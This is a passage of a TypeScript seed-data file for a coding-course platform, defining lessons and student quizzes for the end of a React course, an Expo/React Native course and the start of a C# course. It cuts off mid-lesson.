          type: 'MULTIPLE_CHOICE',
          prompt: "In a controlled input, what determines the input's displayed value?",
          options: ['The DOM, directly', 'A state variable', 'The HTML value attribute alone', 'Nothing, it is uncontrolled by default'],
          answer: 'A state variable',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'When rendering a list with .map(), each element needs a unique ____ prop.',
          options: [],
          answer: 'key',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Using the array index as a key is always safe, even when items can be reordered or removed.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Final Project: Build a Task Board',
    content: lessonContent(
      'Final Project: Build a Task Board',
      `Time to combine components, props, state, effects, and forms into a real React app.\n\n## Requirements\n\n1. Render a list of tasks (\`{ id, text, done }\`) using \`.map()\` with a proper, stable \`key\`.\n2. Let the user add a new task through a controlled form input.\n3. Let the user toggle a task's done state and delete a task, updating state immutably (no direct mutation of the array or its objects).\n4. Fetch an initial list of tasks from an API (or a mock async function) inside \`useEffect\` when the board first mounts.\n5. Split the UI into at least three components, e.g. \`TaskBoard\`, \`TaskForm\`, and \`TaskItem\`, that communicate through props.\n\n## Stretch goals\n\n- Persist tasks to \`localStorage\` so they survive a page reload.\n- Add filter buttons for All / Active / Completed.\n- Show a loading state while the initial fetch is in flight.\n\nSubmit your repository link below when you are done, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const expoLessons: SeedLesson[] = [
  {
    title: 'Why Expo? Setup and Your First App',
    content: lessonContent(
      'Why Expo? Setup and Your First App',
      `**Expo** is a framework and set of tools built on top of React Native that makes building mobile apps with React dramatically simpler: no need to install Xcode or Android Studio to get started, a huge library of pre-built native modules (camera, location, notifications...), and a companion app (**Expo Go**) that runs your app on a real phone instantly, no cables required.\n\n## Bare React Native vs. Expo\n\n| | Bare React Native | Expo |\n|---|---|---|\n| Native project setup | Manual (Xcode/Android Studio) | Handled for you |\n| Native modules | Install & link manually | Huge built-in library (\`expo-camera\`, \`expo-location\`, ...) |\n| Running on a device | Cable + native build | Scan a QR code with Expo Go |\n| Ejecting to bare native code | N/A | Possible any time (\`expo prebuild\`) |\n\nExpo isn't a separate language, you're still writing React and JavaScript/TypeScript, just with a much smoother toolchain around it.\n\n## Creating your first app\n\n\`\`\`bash\nnpx create-expo-app my-app\ncd my-app\nnpx expo start\n\`\`\`\n\n\`npx expo start\` boots a development server and shows a QR code, scan it with the **Expo Go** app (iOS/Android) to run your app on a real device, or press \`i\`/\`a\` in the terminal to launch an iOS/Android simulator if you have one installed.\n\n## Project structure\n\n\`\`\`\nmy-app/\n  app/            # every file here is a screen (file-based routing, next lesson)\n    index.tsx\n    _layout.tsx\n  assets/         # images, fonts\n  app.json        # app name, icon, splash screen, permissions\n  package.json\n\`\`\`\n\n> [!NOTE]\n> Expo apps are still "just React", the core differences from web React are which **components** you use (\`<View>\` instead of \`<div>\`, \`<Text>\` instead of a raw string) and that there's no browser DOM underneath, everything renders to native platform views.`
    ),
    quiz: {
      title: 'Expo Basics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does Expo Go let you do?',
          options: [
            'Compile apps in the cloud only',
            'Run your app on a real device instantly by scanning a QR code',
            'Replace React with a different language',
            'Deploy directly to the app stores without review',
          ],
          answer: 'Run your app on a real device instantly by scanning a QR code',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Expo apps are written in a completely different language from web React.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Running npx expo ____ boots the development server and shows a QR code to scan.',
          options: [],
          answer: 'start',
        },
      ],
    },
  },
  {
    title: 'Navigation with Expo Router',
    content: lessonContent(
      'Navigation with Expo Router',
      `Modern Expo apps use **Expo Router**, a file-based routing system: the folder structure inside \`app/\` directly determines your app's screens and URLs, the same idea as Next.js, applied to mobile.\n\n## Basic routes\n\n\`\`\`\napp/\n  index.tsx        # the "/" screen (home)\n  profile.tsx       # the "/profile" screen\n  settings.tsx       # the "/settings" screen\n\`\`\`\n\n\`\`\`\n// app/profile.tsx\nimport { View, Text } from 'react-native';\n\nexport default function ProfileScreen() {\n  return (\n    <View>\n      <Text>Your profile</Text>\n    </View>\n  );\n}\n\`\`\`\n\nEach file just needs a default-exported component, Expo Router wires up the screen and navigation automatically, no manual route configuration.\n\n## Navigating between screens\n\n\`\`\`\nimport { Link, useRouter } from 'expo-router';\n\nexport default function HomeScreen() {\n  const router = useRouter();\n\n  return (\n    <View>\n      <Link href="/profile">Go to profile</Link>\n      <Button title="Go to settings" onPress={() => router.push('/settings')} />\n    </View>\n  );\n}\n\`\`\`\n\n\`<Link>\` works like an anchor tag, declarative navigation right in your JSX. \`useRouter()\` gives you an imperative API (\`router.push\`, \`router.back\`, \`router.replace\`) for navigating in response to code, like after a form submits successfully.\n\n## Dynamic routes\n\n\`\`\`\napp/\n  courses/\n    [id].tsx      # matches /courses/123, /courses/anything\n\`\`\`\n\n\`\`\`\n// app/courses/[id].tsx\nimport { useLocalSearchParams } from 'expo-router';\n\nexport default function CourseScreen() {\n  const { id } = useLocalSearchParams();\n  return <Text>Course {id}</Text>;\n}\n\`\`\`\n\nSquare brackets in a filename, \`[id].tsx\`, create a **dynamic segment**, \`useLocalSearchParams()\` reads whatever value matched that segment out of the current URL.\n\n## Layouts\n\nA special \`_layout.tsx\` file wraps every screen in the same folder, this is where you'd add a shared tab bar, header, or navigation container:\n\n\`\`\`\n// app/_layout.tsx\nimport { Stack } from 'expo-router';\n\nexport default function RootLayout() {\n  return <Stack />;\n}\n\`\`\``
    ),
    quiz: {
      title: 'Expo Router Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "In Expo Router, what determines your app's screens?",
          options: [
            'A central routes.js config file',
            'The folder/file structure inside app/',
            'XML navigation files',
            'Manually calling registerScreen()',
          ],
          answer: 'The folder/file structure inside app/',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A filename like ____.tsx (with square brackets around the name) creates a dynamic route segment.',
          options: [],
          answer: '[id]',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A special _layout.tsx file lets every screen in that folder share the same wrapper, like a tab bar or header.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Styling with StyleSheet and Flexbox',
    content: lessonContent(
      'Styling with StyleSheet and Flexbox',
      `React Native has no CSS files or class names, styles are plain JavaScript objects, usually created with \`StyleSheet.create\`.\n\n## StyleSheet basics\n\n\`\`\`\nimport { View, Text, StyleSheet } from 'react-native';\n\nexport default function Card() {\n  return (\n    <View style={styles.card}>\n      <Text style={styles.title}>Kodstigen</Text>\n    </View>\n  );\n}\n\nconst styles = StyleSheet.create({\n  card: {\n    padding: 16,\n    borderRadius: 12,\n    backgroundColor: '#1e293b',\n  },\n  title: {\n    fontSize: 20,\n    fontWeight: 'bold',\n    color: 'white',\n  },\n});\n\`\`\`\n\n\`StyleSheet.create\` doesn't do anything magical at runtime, mainly it validates your style objects and lets React Native optimize how they're referenced, but functionally you can pass a plain object to \`style\` too.\n\n## Flexbox is the default layout system\n\nUnlike the web, where \`display: flex\` is opt-in, **every \`<View>\` in React Native lays out its children with Flexbox by default**, and \`flexDirection\` defaults to \`'column'\` (the opposite of the web's \`'row'\` default).\n\n\`\`\`\nconst styles = StyleSheet.create({\n  row: {\n    flexDirection: 'row',\n    justifyContent: 'space-between',\n    alignItems: 'center',\n    padding: 12,\n  },\n});\n\`\`\`\n\n## Combining and conditionally applying styles\n\nThe \`style\` prop accepts an **array** of styles, later ones override earlier ones, this is the standard way to conditionally apply an extra style:\n\n\`\`\`\n<View style={[styles.card, isActive && styles.cardActive]} />\n\`\`\`\n\n> [!TIP]\n> There's no CSS cascade or specificity to fight with, a component only ever gets the styles you explicitly pass to it, nothing leaks in from a parent or a global stylesheet.`
    ),
    quiz: {
      title: 'Styling & Flexbox Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the default flexDirection for a View in React Native?',
          options: ['row', 'column', 'row-reverse', 'none'],
          answer: 'column',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'You must explicitly enable Flexbox with display: flex on every View, like on the web.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Passing an ____ of styles to the style prop lets later styles override earlier ones, useful for conditional styling.',
          options: [],
          answer: 'array',
        },
      ],
    },
  },
  {
    title: 'Handling User Input and State',
    content: lessonContent(
      'Handling User Input and State',
      `State management works exactly the same as web React (\`useState\`, \`useReducer\`), what changes are the native components you use to capture input.\n\n## Text input\n\n\`\`\`\nimport { useState } from 'react';\nimport { TextInput, View } from 'react-native';\n\nexport default function SearchBox() {\n  const [query, setQuery] = useState('');\n\n  return (\n    <View>\n      <TextInput\n        value={query}\n        onChangeText={setQuery}\n        placeholder="Search courses..."\n        style={{ borderWidth: 1, borderRadius: 8, padding: 10 }}\n      />\n    </View>\n  );\n}\n\`\`\`\n\nNote \`onChangeText\`, not \`onChange\`, React Native's \`TextInput\` hands your callback the new string directly, there's no \`event.target.value\` to unwrap like on the web.\n\n## Buttons and touchables\n\n\`\`\`\nimport { Pressable, Text } from 'react-native';\n\nfunction LikeButton({ onPress }) {\n  return (\n    <Pressable onPress={onPress} style={({ pressed }) => ({ opacity: pressed ? 0.6 : 1 })}>\n      <Text>❤️ Like</Text>\n    </Pressable>\n  );\n}\n\`\`\`\n\n\`Pressable\` is the modern, flexible way to make anything tappable, \`style\` can be a function that receives the current interaction state (\`pressed\`, \`hovered\` on web), letting you add feedback like a subtle opacity change without any extra state of your own.\n\n## Forms are just state\n\nThere's no \`<form onSubmit>\` on mobile, a "form" is just a collection of state variables and a button that reads them when pressed:\n\n\`\`\`\nfunction LoginForm() {\n  const [email, setEmail] = useState('');\n  const [password, setPassword] = useState('');\n\n  function handleSubmit() {\n    console.log('logging in with', email, password);\n  }\n\n  return (\n    <View>\n      <TextInput value={email} onChangeText={setEmail} placeholder="Email" />\n      <TextInput value={password} onChangeText={setPassword} placeholder="Password" secureTextEntry />\n      <Pressable onPress={handleSubmit}><Text>Log in</Text></Pressable>\n    </View>\n  );\n}\n\`\`\`\n\n\`secureTextEntry\` masks the input, the native equivalent of \`type="password"\`.`
    ),
    quiz: {
      title: 'Input & State Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which prop does TextInput use to react to typing, instead of onChange?',
          options: ['onInput', 'onChangeText', 'onKeyPress', 'onTextUpdate'],
          answer: 'onChangeText',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "TextInput's change handler receives the raw event object, and you must read event.target.value from it.",
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Setting ____ to true on a TextInput masks the typed characters, like a password field.',
          options: [],
          answer: 'secureTextEntry',
        },
      ],
    },
  },
  {
    title: 'Working with Lists: FlatList',
    content: lessonContent(
      'Working with Lists: FlatList',
      `You could render a list with \`.map()\` like on the web, but for anything beyond a handful of items, React Native gives you \`FlatList\`, a component built specifically for large, scrollable lists.\n\n## Why not just .map()?\n\n\`\`\`\n<ScrollView>\n  {courses.map((c) => <CourseRow key={c.id} course={c} />)}\n</ScrollView>\n\`\`\`\n\nThis renders **every single item immediately**, for a list of 5 that's fine, for a list of 5,000 it tanks performance and memory. \`FlatList\` only renders what's currently visible on screen (plus a small buffer), recycling views as the user scrolls.\n\n## Basic usage\n\n\`\`\`\nimport { FlatList, Text, View } from 'react-native';\n\nfunction CourseList({ courses }) {\n  return (\n    <FlatList\n      data={courses}\n      keyExtractor={(item) => item.id}\n      renderItem={({ item }) => (\n        <View style={{ padding: 12 }}>\n          <Text>{item.title}</Text>\n        </View>\n      )}\n    />\n  );\n}\n\`\`\`\n\n- \`data\` is the array to render.\n- \`keyExtractor\` is FlatList's equivalent of the \`key\` prop, a function returning a unique string id per item.\n- \`renderItem\` receives \`{ item, index }\` and returns the JSX for a single row.\n\n## Useful extras\n\n\`\`\`\n<FlatList\n  data={courses}\n  keyExtractor={(item) => item.id}\n  renderItem={renderCourse}\n  ListEmptyComponent={<Text>No courses yet.</Text>}\n  ListHeaderComponent={<Text>All Courses</Text>}\n  onEndReached={loadMoreCourses}\n  onEndReachedThreshold={0.5}\n  refreshing={isRefreshing}\n  onRefresh={reloadCourses}\n/>\n\`\`\`\n\n\`onEndReached\` fires when the user scrolls near the bottom, the standard hook for **infinite scroll**/pagination. \`refreshing\`/\`onRefresh\` wire up the native pull-to-refresh gesture for free.\n\n> [!WARNING]\n> Never nest a \`FlatList\` inside a \`ScrollView\` that scrolls in the same direction, both will try to own scrolling and you'll get janky, broken behavior. If you need multiple lists on one screen, give \`FlatList\` a fixed height or use \`ListHeaderComponent\`/\`ListFooterComponent\` to add content around a single list instead.`
    ),
    quiz: {
      title: 'FlatList Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why prefer FlatList over .map() inside a ScrollView for a large dataset?',
          options: [
            'FlatList looks nicer by default',
            'FlatList only renders visible items, saving memory and performance',
            'map() does not work at all in React Native',
            'FlatList is required for TypeScript support',
          ],
          answer: 'FlatList only renders visible items, saving memory and performance',
        },
        {
          type: 'FILL_BLANK',
          prompt: "FlatList's ____ prop is a function that returns a unique string id for each item, similar to a key.",
          options: [],
          answer: 'keyExtractor',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'It is safe to nest a FlatList inside a ScrollView that scrolls in the same direction.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Device APIs: Camera, Location, and Permissions',
    content: lessonContent(
      'Device APIs: Camera, Location, and Permissions',
      `One of Expo's biggest advantages is instant access to native device features through simple JavaScript APIs, no native code required. Nearly all of them follow the same **permission pattern**.\n\n## The permission pattern\n\n\`\`\`\nimport * as Location from 'expo-location';\n\nasync function getCurrentLocation() {\n  const { status } = await Location.requestForegroundPermissionsAsync();\n  if (status !== 'granted') {\n    console.log('Permission denied');\n    return null;\n  }\n  const location = await Location.getCurrentPositionAsync({});\n  return location.coords;\n}\n\`\`\`\n\nEvery device API works the same way: **request permission** (the OS shows a native prompt the first time), **check the result**, then use the API only if granted. Never assume permission, always request and check.\n\n## Using the camera\n\n\`\`\`\nimport { CameraView, useCameraPermissions } from 'expo-camera';\n\nfunction ScannerScreen() {\n  const [permission, requestPermission] = useCameraPermissions();\n\n  if (!permission) return null; // still loading\n  if (!permission.granted) {\n    return <Button title="Grant camera access" onPress={requestPermission} />;\n  }\n\n  return <CameraView style={{ flex: 1 }} />;\n}\n\`\`\`\n\n\`useCameraPermissions()\` is a hook version of the same request/check pattern, common for APIs used directly inside a component.\n\n## Declaring permissions in app.json\n\nSome permissions (especially on iOS) also need a usage description declared in \`app.json\`, explaining *why* your app wants access, shown to the user in the native permission dialog:\n\n\`\`\`\n{\n  "expo": {\n    "ios": {\n      "infoPlist": {\n        "NSCameraUsageDescription": "This app uses the camera to scan QR codes."\n      }\n    }\n  }\n}\n\`\`\`\n\n> [!NOTE]\n> Most of Expo's device modules (\`expo-camera\`, \`expo-location\`, \`expo-notifications\`, \`expo-contacts\`, ...) are separate packages you install individually with \`npx expo install expo-camera\`, using \`expo install\` instead of plain \`npm install\` ensures you get a version compatible with your Expo SDK version.`
    ),
    quiz: {
      title: 'Device APIs Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the correct pattern for using a device API like the camera or location?',
          options: [
            'Use it directly, permissions are automatic',
            'Request permission, check the result, then use the API',
            'Only request permission if the app crashes first',
            'Permissions only apply to Android, not iOS',
          ],
          answer: 'Request permission, check the result, then use the API',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Use npx expo ____ (instead of plain npm install) to add a device API package compatible with your Expo SDK version.',
          options: [],
          answer: 'install',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'iOS usage-description strings for permissions like the camera are configured in app.json.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Data Persistence and Fetching',
    content: lessonContent(
      'Data Persistence and Fetching',
      `Mobile apps need two different kinds of data handling: fetching from a remote API (same \`fetch\`/\`useEffect\` pattern as web React), and persisting small bits of data locally so they survive an app restart.\n\n## Fetching data\n\n\`\`\`\nimport { useEffect, useState } from 'react';\n\nfunction useCourses() {\n  const [courses, setCourses] = useState([]);\n  const [loading, setLoading] = useState(true);\n\n  useEffect(() => {\n    fetch('https://api.example.com/courses')\n      .then((res) => res.json())\n      .then(setCourses)\n      .finally(() => setLoading(false));\n  }, []);\n\n  return { courses, loading };\n}\n\`\`\`\n\nThis is identical to fetching in web React, \`fetch\` and \`useEffect\` work exactly the same in React Native.\n\n## Persisting data with AsyncStorage\n\nThere's no browser \`localStorage\` on mobile, the equivalent is \`@react-native-async-storage/async-storage\`, an async key-value store.\n\n\`\`\`\nimport AsyncStorage from '@react-native-async-storage/async-storage';\n\nasync function saveDraft(text) {\n  await AsyncStorage.setItem('noteDraft', text);\n}\n\nasync function loadDraft() {\n  const value = await AsyncStorage.getItem('noteDraft');\n  return value ?? '';\n}\n\`\`\`\n\nEvery method is **async** and returns a Promise, unlike \`localStorage\`'s synchronous API, this matters when you're loading saved data on app startup, you'll typically do it inside a \`useEffect\` and show a loading state until it resolves.\n\n## Storing objects\n\n\`AsyncStorage\` only stores strings, so store objects as JSON:\n\n\`\`\`\nasync function saveTasks(tasks) {\n  await AsyncStorage.setItem('tasks', JSON.stringify(tasks));\n}\n\nasync function loadTasks() {\n  const raw = await AsyncStorage.getItem('tasks');\n  return raw ? JSON.parse(raw) : [];\n}\n\`\`\`\n\n> [!WARNING]\n> AsyncStorage is meant for small amounts of data (settings, drafts, a cached list), it is **not encrypted** and not meant for sensitive data like auth tokens, for those, use \`expo-secure-store\` instead, which stores values in the device's encrypted keychain.`
    ),
    quiz: {
      title: 'Persistence & Fetching Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What is the mobile equivalent of the web's localStorage?",
          options: ['sessionStorage', 'AsyncStorage', 'IndexedDB', 'cookies'],
          answer: 'AsyncStorage',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'AsyncStorage methods are synchronous, just like localStorage.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Since AsyncStorage only stores strings, objects must be serialized with JSON.____ before saving.',
          options: [],
          answer: 'stringify',
        },
      ],
    },
  },
  {
    title: 'Building and Publishing Your App',
    content: lessonContent(
      'Building and Publishing Your App',
      `Once your app works in Expo Go, the final step is producing a real, installable build, and eventually shipping it to the App Store / Google Play.\n\n## EAS Build\n\n**EAS (Expo Application Services)** builds native app binaries in the cloud, so you don't need a Mac to build an iOS app.\n\n\`\`\`bash\nnpm install -g eas-cli\neas login\neas build:configure\neas build --platform ios\neas build --platform android\n\`\`\`\n\n\`eas build:configure\` sets up an \`eas.json\` with build profiles (e.g. \`development\`, \`preview\`, \`production\`), each can produce a different kind of build, a quick internal test build vs. a production, store-ready one.\n\n## App configuration\n\nYour app's name, icon, splash screen, version, and bundle identifier all live in \`app.json\` (or \`app.config.js\` for dynamic config):\n\n\`\`\`\n{\n  "expo": {\n    "name": "Kodstigen Notes",\n    "slug": "kodstigen-notes",\n    "version": "1.0.0",\n    "icon": "./assets/icon.png",\n    "ios": { "bundleIdentifier": "com.kodstigen.notes" },\n    "android": { "package": "com.kodstigen.notes" }\n  }\n}\n\`\`\`\n\n## Submitting to the stores\n\n\`\`\`bash\neas submit --platform ios\neas submit --platform android\n\`\`\`\n\n\`eas submit\` uploads your latest build directly to App Store Connect / the Google Play Console, from there it goes through each store's normal review process, exactly like an app built without Expo at all.\n\n## Over-the-air updates\n\nFor JavaScript-only changes (no new native code), **EAS Update** can push a new version directly to users who already installed your app, skipping the app store review entirely:\n\n\`\`\`bash\neas update --branch production --message "Fix login bug"\n\`\`\`\n\n> [!NOTE]\n> OTA updates can only ship JavaScript/asset changes, if you add a new native dependency (like a new device API package), that requires a full new build submitted through the store again.`
    ),
    quiz: {
      title: 'Build & Publish Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does EAS Build let you do without owning a Mac?',
          options: ['Write Swift code', 'Build an iOS app binary in the cloud', 'Design app icons', 'Test on physical Android devices'],
          answer: 'Build an iOS app binary in the cloud',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'eas ____ uploads your latest build directly to the App Store or Google Play Console.',
          options: [],
          answer: 'submit',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'An over-the-air (OTA) update can ship a brand-new native dependency without a new store submission.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Final Project: Build a Mobile Notes App with Expo',
    content: lessonContent(
      'Final Project: Build a Mobile Notes App with Expo',
      `Combine everything from this course into one real, working mobile app: a simple notes app you can run on your own phone with Expo Go.\n\n## Requirements\n\n1. Set up a new Expo project with Expo Router and at least two screens: a notes list screen and a note detail/edit screen, connected with file-based routing (a dynamic \`[id]\` route for viewing/editing a single note).\n2. Let the user create a new note (title + body) through a controlled form.\n3. Render the list of notes with \`FlatList\`, not \`.map()\`.\n4. Persist notes to the device with \`AsyncStorage\`, so they're still there after fully closing and reopening the app.\n5. Let the user delete a note, with a confirmation step (e.g. a native \`Alert.alert\` confirm dialog) before it's removed.\n6. Style the app with \`StyleSheet\`, at minimum a card-style note list and a clean editing screen.\n\n## Stretch goals\n\n- Add a search bar that filters the notes list as you type.\n- Add a timestamp to each note (created/last edited) using \`Date\`.\n- Request camera permission and let the user attach a photo to a note with \`expo-image-picker\`.\n- Build it with \`eas build\` and install the real binary on your phone instead of only running it through Expo Go.\n\nSubmit a link to your finished project (a repo or gist) below, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const csharpLessons: SeedLesson[] = [
  {
    title: 'Hello, C#',
    content: lessonContent(
      'Hello, C#',
      `C# (pronounced "C sharp") is a statically-typed, object-oriented language built by Microsoft for the .NET platform. It's used for everything from web APIs (ASP.NET) to desktop apps to game development (Unity).\n\n\`\`\`csharp\nusing System;\n\nclass Program\n{\n    static void Main()\n    {\n        Console.WriteLine("Hello, Kodstigen!");\n    }\n}\n\`\`\`\n\n## The pieces\n\n- \`using System;\` imports the namespace that contains \`Console\` and other common types.\n- Every C# program needs an entry point method called \`Main\`, that's where execution starts.\n- \`Console.WriteLine(...)\` prints a line of text to the terminal.\n\nCompile and run a C# project with the .NET CLI:\n\n\`\`\`bash\ndotnet run\n\`\`\``
    ),
    quiz: {
      title: 'C# Basics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the entry point method of a C# program called?',
          options: ['Start', 'Main', 'Run', 'Init'],
          answer: 'Main',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Console.____("Hello!") prints a line of text to the console.',
          options: [],
          answer: 'WriteLine',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'C# is a statically-typed language.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Variables and Types',
    content: lessonContent(
      'Variables and Types',
      `\`\`\`csharp\nint xp = 100;\nstring name = "Ada";\nbool isInstructor = true;\ndouble score = 92.5;\n\nConsole.WriteLine($"{name} has {xp} XP");\n\`\`\`\n\n## Common types\n\n| Type | Example |\n|------|---------|\n| \`int\` | \`42\` |\n| \`double\` | \`3.14\` |\n| \`string\` | \`"hello"\` |\n| \`bool\` | \`true\` / \`false\` |\n\n## String interpolation\n\nA \`$"..."\` string lets you embed expressions directly with \`{ }\`, this is called **string interpolation**.\n\n## Type inference with \`var\`\n\n\`\`\`csharp\nvar count = 10; // the compiler infers count is an int\n\`\`\`\n\n\`var\` doesn't make C# dynamically typed, the compiler still figures out and locks in a concrete type at compile time, it just saves you from writing it out.`
    ),
    quiz: {
      title: 'Variables Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "Which keyword lets the compiler infer a variable's type from its initial value?",
          options: ['auto', 'var', 'let', 'dynamic'],
          answer: 'var',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Embedding expressions directly in a string with $"{name}" is called string ____.',
          options: [],
          answer: 'interpolation',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Once a variable is declared as an int, you can later assign a string to it without casting or conversion.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Control Flow and Loops',
    content: lessonContent(
      'Control Flow and Loops',
      `\`\`\`csharp\nint xp = 45;\n\nif (xp >= 50)\n{\n    Console.WriteLine("Level up!");\n}\nelse\n{\n    Console.WriteLine($"Keep going, {50 - xp} XP to go.");\n}\n\nfor (int i = 1; i <= 5; i++)\n{\n    Console.WriteLine($"Lesson {i}");\n}\n\nforeach (var lang in new[] { "C#", "Python", "JavaScript" })\n{\n    Console.WriteLine(lang);\n}\n\`\`\`\n\n## The pieces\n\n- \`if\` / \`else\` branch on a boolean condition.\n- \`for (init; condition; increment)\` is best when you know how many times to loop.\n- \`foreach (var item in collection)\` visits every element of an array or collection without needing an index, use it whenever you don't need the index itself.`
    ),
    quiz: {
      title: 'Control Flow Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which loop is the best fit for visiting every element of a collection without needing an index?',
          options: ['for', 'foreach', 'while', 'do-while'],
          answer: 'foreach',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A for loop has three parts separated by semicolons: initializer, condition, and ____.',
          options: [],
          answer: 'increment',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'An if statement in C# requires its condition to evaluate to a boolean.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Methods and Classes',
    content: lessonContent(
      'Methods and Classes',
      `A **class** bundles data (fields) and behavior (methods) together, it's the blueprint for creating objects.\n\n\`\`\`csharp\nclass Student\n{\n    public string Name;\n    public int Xp;\n\n    public Student(string name, int xp = 0)\n    {\n        Name = name;\n        Xp = xp;\n    }\n\n    public int GainXp(int amount)\n    {\n        Xp += amount;\n        return Xp;\n    }\n}\n\nvar ada = new Student("Ada");\nada.GainXp(50);\nConsole.WriteLine($"{ada.Name} has {ada.Xp} XP");\n\`\`\`\n\n## Key pieces\n\n- The method with the same name as the class (\`Student(string name, int xp = 0)\`) is the **constructor**, it runs when you create a new instance.\n- \`new Student("Ada")\` allocates a new object and runs its constructor.\n- \`public\` fields and methods are accessible from outside the class, by convention C# method and property names use PascalCase (\`GainXp\`, not \`gainXp\`).`
    ),
    quiz: {
      title: 'Classes Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the method that runs automatically when you create a new instance of a class called?',
          options: ['The destructor', 'The constructor', 'The initializer', 'The allocator'],
          answer: 'The constructor',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The ____ keyword allocates a new instance of a class and runs its constructor.',
          options: [],
          answer: 'new',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'By convention, C# method names use PascalCase, like GainXp rather than gainXp.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Collections and LINQ',
    content: lessonContent(
      'Collections and LINQ',
      `\`\`\`csharp\nusing System.Linq;\n\nList<int> scores = new List<int> { 80, 92, 67, 100 };\n\nvar passed = scores.Where(s => s >= 70).ToList();\nvar doubled = scores.Select(s => s * 2).ToList();\nint total = scores.Sum();\n\nConsole.WriteLine($"passed: {string.Join(", ", passed)}");\nConsole.WriteLine($"total: {total}");\n\`\`\`\n\n## Collections\n\n\`List<T>\` is a resizable, generic collection, the \`<int>\` says it only holds \`int\`s.\n\n## LINQ\n\n**LINQ** (Language Integrated Query) adds query-style methods to collections, similar to JavaScript's \`map\`/\`filter\`/\`reduce\`:\n\n| LINQ | JavaScript equivalent |\n|------|------------------------|\n| \`Where(predicate)\` | \`filter\` |\n| \`Select(transform)\` | \`map\` |\n| \`Sum()\` | \`reduce\` (adding) |\n\nLINQ methods live in the \`System.Linq\` namespace, and (like the JavaScript array methods they resemble) return a new sequence rather than modifying the original.`
    ),
    quiz: {
      title: 'Collections & LINQ Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which LINQ method keeps only the elements that match a condition?',
          options: ['Select', 'Where', 'Sum', 'ToList'],
          answer: 'Where',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A resizable, generic collection of integers is declared as List<____>.',
          options: [],
          answer: 'int',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'LINQ methods like Where and Select modify the original collection in place.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Final Project: Console Grade Book',
    content: lessonContent(
      'Final Project: Console Grade Book',
